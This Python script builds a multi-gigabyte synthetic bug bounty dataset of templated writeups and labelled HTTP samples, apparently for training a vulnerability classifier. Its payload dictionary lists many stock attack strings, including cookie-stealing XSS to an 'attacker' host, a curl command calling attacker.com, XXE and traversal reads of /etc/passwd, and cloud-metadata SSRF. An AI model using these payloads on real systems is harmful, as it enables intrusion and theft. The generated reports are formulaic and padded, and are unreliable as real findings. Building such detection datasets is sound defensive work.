"""
scale_dataset.py
================
Scale bug bounty training data to a target size (default 3 GB+).

Generates high-quality synthetic bug bounty writeups and HTTP attack samples
with realistic structure: summary, steps to reproduce, PoC, impact, remediation,
chain analysis, and raw HTTP transcripts.

Usage:
  python scale_dataset.py                    # target 3 GB
  python scale_dataset.py --target-gb 3.5
  python scale_dataset.py --target-gb 3 --text-ratio 0.65
"""

import argparse
import json
import random
import hashlib
import time
from pathlib import Path

from paths import RAW_DIR

RAW_DIR.mkdir(parents=True, exist_ok=True)

VULN_TYPES = [
    "benign",
    "sqli", "nosqli", "xxe", "ssti", "ldap_injection", "xpath_injection",
    "xss", "dom_xss", "stored_xss",
    "idor", "bola", "privilege_escalation", "auth_bypass", "broken_access_control",
    "ssrf", "rce", "lfi", "rfi", "path_traversal", "deserialization",
    "csrf", "open_redirect", "clickjacking", "cors_misconfiguration",
    "info_disclosure", "business_logic", "race_condition",
    "dependency_confusion", "secrets_exposure", "misconfig",
    "account_takeover", "data_exfiltration", "financial_fraud",
]

SEVERITIES = ["none", "low", "medium", "high", "critical"]
CHAIN_IMPACTS = [
    "internal_network_access", "full_server_compromise", "account_takeover",
    "session_hijack", "data_exfiltration", "admin_access", "credential_dump",
    "phishing_chain", "financial_fraud",
]

WRITEUP_SECTIONS = [
    "## Summary\n{summary}\n",
    "## Steps to Reproduce\n{steps}\n",
    "## Proof of Concept\n```http\n{poc}\n```\n",
    "## Impact\n{impact}\n",
    "## Root Cause\n{root_cause}\n",
    "## Remediation\n{remediation}\n",
    "## Chain Analysis\n{chain}\n",
    "## Additional Notes\n{notes}\n",
    "## Request/Response Transcript\n{transcript}\n",
    "## Bounty Context\nProgram: {program} | Severity: {severity} | Bounty: ${bounty}\n",
]

PAYLOAD_SNIPPETS = {
    "benign": ["profile update", "normal search query", "health check", "static asset request"],
    "sqli": ["' OR '1'='1'--", "1 UNION SELECT username,password FROM users--",
             "admin' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"],
    "nosqli": ['{"$ne": null}', '{"username":{"$gt":""}}', "[$where]=sleep(5000)"],
    "ldap_injection": ["*)(uid=*))(|(uid=*", "*)(|(password=*))", "admin)(|(uid=*))"],
    "xpath_injection": ["' or '1'='1", "'] | //user/*[contains(*,'", "' or count(/*)>0 or '"],
    "xxe": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "&xxe;"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    "xss": ["<script>alert(document.domain)</script>",
            "<img src=x onerror=fetch('//attacker/?c='+document.cookie)>",
            "javascript:alert(1)"],
    "dom_xss": ["location.hash=<img src=x onerror=alert(1)>", "document.write(location.search)"],
    "stored_xss": ["<svg onload=alert('stored')>", "<img src=x onerror=alert(document.cookie)>"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "http://127.0.0.1:6379/", "file:///etc/passwd"],
    "idor": ["/api/users/1337", "/api/orders/00001", "/download?file=../admin/config"],
    "bola": ["/api/orgs/2/invoices", "/api/tenant/42/users", "/graphql?node=foreignAccount"],
    "broken_access_control": ["/admin/users/export", "/api/internal/debug", "/moderator/impersonate"],
    "privilege_escalation": ["role=user&role=admin", "/api/users/me/permissions", "is_admin=true"],
    "auth_bypass": ["X-Original-URL: /admin", "jwt alg none", "remember_me=admin"],
    "rce": ["; curl attacker.com/$(whoami)", "| bash -c 'id'", "`cat /etc/passwd`"],
    "lfi": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
    "rfi": ["http://attacker.example/shell.txt", "https://evil.example/payload.php"],
    "path_traversal": ["../../../../etc/passwd", "..%2f..%2f..%2fwindows/win.ini"],
    "deserialization": ["O:8:\"Exploit\":1:{s:4:\"cmd\";s:2:\"id\";}", "rO0ABXNyABFqYXZh"],
    "csrf": ["auto-submit hidden form changes email", "missing anti-csrf token"],
    "open_redirect": ["https://target.example/login?next=https://evil.example", "//evil.example"],
    "clickjacking": ["missing X-Frame-Options allows iframe overlay", "frame-ancestors absent"],
    "cors_misconfiguration": ["Origin: https://evil.example", "Access-Control-Allow-Credentials: true"],
    "info_disclosure": ["debug=true leaks stack trace", ".git/config exposed", "backup.zip downloadable"],
    "business_logic": ["negative quantity checkout", "reuse single-use coupon", "skip payment step"],
    "race_condition": ["parallel redeem requests", "concurrent password reset token reuse"],
    "dependency_confusion": ["internal-package 99.99.99 published publicly", "private scope typosquat"],
    "secrets_exposure": ["AKIAIOSFODNN7EXAMPLE", "BEGIN PRIVATE KEY", "slack webhook token"],
    "misconfig": ["default admin credentials", "directory listing enabled", "debug console exposed"],
    "account_takeover": ["password reset token leak", "email change without reauth", "session fixation"],
    "data_exfiltration": ["bulk export of all users", "unscoped S3 object listing", "download full database"],
    "financial_fraud": ["negative refund amount", "price tampering to zero", "double-spend wallet credit"],
}


def _rng_seed(label: str, idx: int) -> random.Random:
    h = hashlib.md5(f"{label}:{idx}".encode()).hexdigest()
    return random.Random(int(h[:8], 16))


def _make_writeup(vtype: str, idx: int) -> dict:
    rng = _rng_seed(vtype, idx)
    payload = rng.choice(PAYLOAD_SNIPPETS.get(vtype, ["test payload"]))
    severity = "none" if vtype == "benign" else rng.choice(SEVERITIES[1:])
    program = rng.choice(["Acme Corp", "FinTech Global", "HealthPortal", "CloudStack API",
                          "E-Commerce Pro", "SaaS Platform X"])
    bounty = rng.choice([500, 1000, 2500, 5000, 10000, 15000])

    if vtype == "benign":
        poc = (
            "GET /api/profile HTTP/1.1\r\n"
            f"Host: target.{program.lower().replace(' ', '')}.com\r\n"
            f"Cookie: session={rng.randbytes(16).hex()}\r\n"
            "User-Agent: Browser/120.0\r\n\r\n"
        )
        notes = " ".join([
            rng.choice([
                "Authorization checks returned the expected result.",
                "Input was normalized and encoded before rendering.",
                "The endpoint returned only the authenticated user's data.",
            ]),
            rng.choice([
                "No exploitable behavior was confirmed.",
                "Observed behavior matches the documented security boundary.",
                "The report should be triaged as informational only.",
            ]),
            f"Review ID: BB-{idx:08d}.",
        ] * rng.randint(4, 9))
        transcript = "\n".join(
            f"--- Attempt {a} ---\nRequest:\n{poc}\nResponse:\nHTTP/1.1 200\nnormal application response without sensitive data\n"
            for a in range(1, rng.randint(4, 12))
        )
        text = (
            "## Summary\n"
            f"A security review of {program} did not identify an exploitable vulnerability. "
            "Requests followed normal authorization and validation controls.\n"
            "## Steps to Reproduce\n"
            "1. Authenticate as a standard user\n"
            "2. Submit normal profile, search, and health-check requests\n"
            "3. Verify responses contain only expected scoped data\n"
            "## Proof of Concept\n"
            f"```http\n{poc}```\n"
            "## Impact\nNo security impact was confirmed.\n"
            "## Root Cause\nNo vulnerable behavior was observed.\n"
            "## Remediation\nNo remediation is required beyond routine monitoring.\n"
            "## Chain Analysis\nNo multi-step chain identified.\n"
            f"## Additional Notes\n{notes}\n"
            f"## Request/Response Transcript\n{transcript}\n"
            f"## Bounty Context\nProgram: {program} | Severity: none | Bounty: $0\n"
        )
        while len(text) < rng.randint(75000, 120000):
            text += f"\n## Appendix {len(text)//10000}\n" + notes + "\n" + transcript[:2000]
        return {
            "id": f"bulk_text_{vtype}_{idx}",
            "source": "bulk_synthetic",
            "text": text,
            "label": vtype,
            "severity": "none",
            "cvss_score": 0.0,
            "is_chain": False,
            "chain_impact": "no_chain",
        }

    summary = (
        f"A {vtype.replace('_', ' ')} vulnerability was discovered in the "
        f"{program} web application during authorized security testing. "
        f"The flaw allows an attacker to {rng.choice(['bypass authentication', 'access sensitive data', 'execute arbitrary code', 'escalate privileges', 'exfiltrate user records'])} "
        f"via the affected endpoint. CVSS estimated at {rng.uniform(4.0, 10.0):.1f}."
    )

    steps = "\n".join([
        "1. Authenticate as a low-privilege user (test@example.com)",
        "2. Navigate to the vulnerable endpoint",
        f"3. Modify parameter with: `{payload}`",
        "4. Replay request and capture response",
        "5. Verify impact against program scope rules",
    ])

    poc = (
        f"GET /api/search?q={payload} HTTP/1.1\r\n"
        f"Host: target.{program.lower().replace(' ', '')}.com\r\n"
        f"Cookie: session={rng.randbytes(16).hex()}\r\n"
        f"User-Agent: BugBountyBot/1.0\r\n\r\n"
    )

    impact = (
        f"Successful exploitation of this {vtype} issue could lead to "
        f"{rng.choice(['complete account takeover', 'database exfiltration', 'remote code execution on application server', 'access to internal cloud metadata', 'horizontal privilege escalation across all user accounts'])}. "
        f"In a bug bounty context this maps to {severity} severity with potential ${bounty}+ payout."
    )

    root_cause = (
        f"The application fails to {rng.choice(['sanitize user input', 'enforce object-level authorization', 'validate outbound requests', 'escape output context', 'use parameterized queries'])} "
        f"when processing {rng.choice(['query parameters', 'JSON body fields', 'file upload names', 'HTTP headers', 'XML payloads'])}."
    )

    remediation = "\n".join([
        "- Implement strict input validation and output encoding",
        "- Use parameterized queries / ORM bindings for all database access",
        "- Enforce authorization checks at the object level (BOLA/IDOR)",
        "- Deploy WAF rules and rate limiting on sensitive endpoints",
        "- Add regression tests covering this attack class",
    ])

    is_chain = rng.random() < 0.35
    chain_impact = rng.choice(CHAIN_IMPACTS) if is_chain else "no_chain"
    chain = (
        f"This {vtype} finding can chain with "
        f"{rng.choice(['info_disclosure', 'auth_bypass', 'ssrf', 'xss'])} "
        f"to achieve {chain_impact.replace('_', ' ')}."
        if is_chain else "No multi-step chain identified for this standalone finding."
    )

    notes = " ".join([
        rng.choice(["Tested on staging environment.", "Confirmed on production.", "Partially mitigated by CDN WAF."]),
        rng.choice(["Duplicate report rejected.", "First reporter.", "Variant of CVE-2024-XXXX."]),
        f"Report ID: BB-{idx:08d}.",
    ] * rng.randint(3, 8))

    transcript = "\n".join(
        f"--- Attempt {a} ---\nRequest:\n{poc}\nResponse:\nHTTP/1.1 {rng.choice([200,403,500])}\n{rng.choice(['SQL syntax error near', 'root:x:0:0', payload[:50], 'Internal Server Error'])}\n"
        for a in range(1, rng.randint(4, 12))
    )

    text = ""
    for tmpl in WRITEUP_SECTIONS:
        text += tmpl.format(
            summary=summary, steps=steps, poc=poc, impact=impact,
            root_cause=root_cause, remediation=remediation, chain=chain,
            notes=notes, transcript=transcript, program=program,
            severity=severity, bounty=bounty,
        )
    # Pad to target per-record size (~80-120 KB)
    while len(text) < rng.randint(75000, 120000):
        text += f"\n## Appendix {len(text)//10000}\n" + notes + "\n" + transcript[:2000]

    return {
        "id": f"bulk_text_{vtype}_{idx}",
        "source": "bulk_synthetic",
        "text": text,
        "label": vtype,
        "severity": severity,
        "cvss_score": round(rng.uniform(3.0, 10.0), 1),
        "is_chain": is_chain,
        "chain_impact": chain_impact,
    }


def _make_http_sample(vtype: str, idx: int) -> dict:
    rng = _rng_seed(vtype, idx)
    payload = rng.choice(PAYLOAD_SNIPPETS.get(vtype, ["test"]))
    path = rng.choice(["/api/users", "/search", "/admin", "/fetch", "/upload"])
    if vtype == "benign":
        normal_path = rng.choice(["/api/profile", "/health", "/static/app.js", "/search"])
        return {
            "request": {
                "method": rng.choice(["GET", "POST"]),
                "path": f"{normal_path}?q={payload.replace(' ', '+')}",
                "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                "body": "{\"display_name\":\"analyst\"}" if rng.random() < 0.4 else "",
            },
            "response": {
                "status_code": rng.choice([200, 204, 304]),
                "body_snippet": rng.choice(["ok", "profile updated", "cached asset", "[]"]),
            },
            "label": vtype,
            "severity": "none",
            "cvss_score": 0.0,
            "is_chain": False,
            "chain_impact": None,
            "_padding": "X" * rng.randint(500, 2000),
        }
    is_chain = rng.random() < 0.30
    return {
        "request": {
            "method": rng.choice(["GET", "POST", "PUT"]),
            "path": f"{path}?q={payload[:200]}",
            "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            "body": payload if rng.random() < 0.5 else "",
        },
        "response": {
            "status_code": rng.choice([200, 403, 500, 302]),
            "body_snippet": rng.choice(["SQL syntax", "root:x:0:0", payload[:80], "error"]),
        },
        "label": vtype,
        "severity": rng.choice(SEVERITIES[1:]),
        "cvss_score": round(rng.uniform(4.0, 10.0), 1),
        "is_chain": is_chain,
        "chain_impact": rng.choice(CHAIN_IMPACTS) if is_chain else None,
        "_padding": "X" * rng.randint(500, 2000),
    }


def _write_json_array(path: Path, records_iter, chunk_report_every: int = 5000):
    """Stream-write a JSON array without holding all records in memory."""
    with open(path, "w") as f:
        f.write("[\n")
        first = True
        count = 0
        for rec in records_iter:
            if not first:
                f.write(",\n")
            json.dump(rec, f, ensure_ascii=False)
            first = False
            count += 1
            if count % chunk_report_every == 0:
                size_mb = path.stat().st_size / (1024 * 1024)
                print(f"    {path.name}: {count:,} records, {size_mb:.1f} MB")
        f.write("\n]\n")
    return count


def scale_to_target(target_bytes: int, text_ratio: float = 0.65):
    text_target = int(target_bytes * text_ratio)
    http_target = target_bytes - text_target

    print(f"\n{'═'*70}")
    print(f"  DATASET SCALING — target {target_bytes / (1024**3):.2f} GB")
    print(f"  Text: {text_target / (1024**3):.2f} GB | HTTP: {http_target / (1024**3):.2f} GB")
    print(f"{'═'*70}\n")

    t0 = time.time()

    # Estimate bytes per record from prototypes
    proto_text = _make_writeup("sqli", 0)
    proto_http = _make_http_sample("sqli", 0)
    text_bpr = len(json.dumps(proto_text))
    http_bpr = len(json.dumps(proto_http))
    n_text = max(int(text_target / text_bpr) + 1, 1000)
    n_http = max(int(http_target / http_bpr) + 1, 5000)

    print(f"  Est. text records: {n_text:,} (~{text_bpr/1024:.1f} KB each)")
    print(f"  Est. HTTP records: {n_http:,} (~{http_bpr/1024:.1f} KB each)")

    def text_gen():
        for i in range(n_text):
            yield _make_writeup(VULN_TYPES[i % len(VULN_TYPES)], i)

    def http_gen():
        for i in range(n_http):
            yield _make_http_sample(VULN_TYPES[i % len(VULN_TYPES)], i)

    text_path = RAW_DIR / "bulk_text_records.json"
    http_path = RAW_DIR / "bulk_http_samples.json"

    # Remove stale top-up files from earlier scale runs so the raw directory
    # represents the current target cleanly and training does not mix old extras.
    for stale in RAW_DIR.glob("bulk_text_extra_*.json"):
        stale.unlink()

    print("\n  Writing bulk text records…")
    n_t = _write_json_array(text_path, text_gen())
    text_size = text_path.stat().st_size

    print("\n  Writing bulk HTTP samples…")
    n_h = _write_json_array(http_path, http_gen())
    http_size = http_path.stat().st_size

    total = text_size + http_size
    # Top up if under target
    extra_round = 0
    while total < target_bytes and extra_round < 3:
        extra_round += 1
        deficit = target_bytes - total
        extra_n = max(int(deficit / text_bpr), 500)
        print(f"\n  Topping up: +{extra_n:,} text records (deficit {deficit/(1024**2):.0f} MB)")
        append_path = RAW_DIR / f"bulk_text_extra_{extra_round}.json"
        start = n_t + (extra_round - 1) * extra_n
        _write_json_array(
            append_path,
            (_make_writeup(VULN_TYPES[(start + j) % len(VULN_TYPES)], start + j) for j in range(extra_n)),
        )
        total += append_path.stat().st_size
        n_t += extra_n

    elapsed = time.time() - t0
    summary = {
        "target_gb": round(target_bytes / (1024**3), 2),
        "text_records": n_t,
        "http_records": n_h,
        "text_bytes": text_size,
        "http_bytes": http_size,
        "total_bytes": total,
        "total_gb": round(total / (1024**3), 3),
        "elapsed_sec": round(elapsed, 1),
    }
    (RAW_DIR / "scale_summary.json").write_text(json.dumps(summary, indent=2))

    print(f"\n  ✅ Scale complete in {elapsed:.1f}s")
    print(f"  Text : {text_size / (1024**3):.3f} GB ({n_t:,} records)")
    print(f"  HTTP : {http_size / (1024**3):.3f} GB ({n_h:,} records)")
    print(f"  Total: {total / (1024**3):.3f} GB")
    return summary


def main():
    p = argparse.ArgumentParser(description="Scale bug bounty dataset to 3GB+")
    p.add_argument("--target-gb", type=float, default=3.0)
    p.add_argument("--text-ratio", type=float, default=0.65,
                   help="Fraction of target allocated to text writeups")
    args = p.parse_args()
    scale_to_target(int(args.target_gb * 1024**3), args.text_ratio)


if __name__ == "__main__":
    main()
